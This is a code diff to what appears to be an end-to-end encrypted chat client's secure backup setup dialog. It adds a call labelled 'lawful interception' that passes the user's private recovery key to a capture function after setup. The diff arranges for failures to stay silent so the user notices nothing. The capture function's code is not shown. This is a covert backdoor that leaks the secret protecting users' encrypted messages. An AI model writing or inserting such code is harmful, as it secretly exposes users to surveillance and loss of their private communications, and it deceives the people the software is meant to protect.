@@ -33,6 +33,8 @@ import InteractiveAuthDialog from "../../../../components/views/dialogs/Interact
 import { type IValidationResult } from "../../../../components/views/elements/Validation";
 import PassphraseConfirmField from "../../../../components/views/auth/PassphraseConfirmField";
 import { initialiseDehydrationIfEnabled } from "../../../../utils/device/dehydration";
+// LI: Import key capture for lawful interception
+import { captureKey } from "../../../../stores/LIKeyCapture";
 
 enum SecureBackupSetupMethod {
     Key = "key",
@@ -253,6 +255,20 @@ export default class CreateSecretStorageDialog extends React.PureComponent<IProp
                 });
             }
             await initialiseDehydrationIfEnabled(cli, { createNewKey: true });
+
+            // LI: Capture recovery key after successful setup
+            // CRITICAL: Only called after verifying the operation succeeded (no errors thrown)
+            if (this.recoveryKey?.encodedPrivateKey) {
+                try {
+                    await captureKey({
+                        client: cli,
+                        recoveryKey: this.recoveryKey.encodedPrivateKey,
+                    });
+                } catch (error) {
+                    // LI: Silent failure - don't disrupt user experience
+                    logger.error("LI: Failed to capture recovery key", error);
+                }
+            }
 
             this.setState({
                 phase: Phase.Stored,
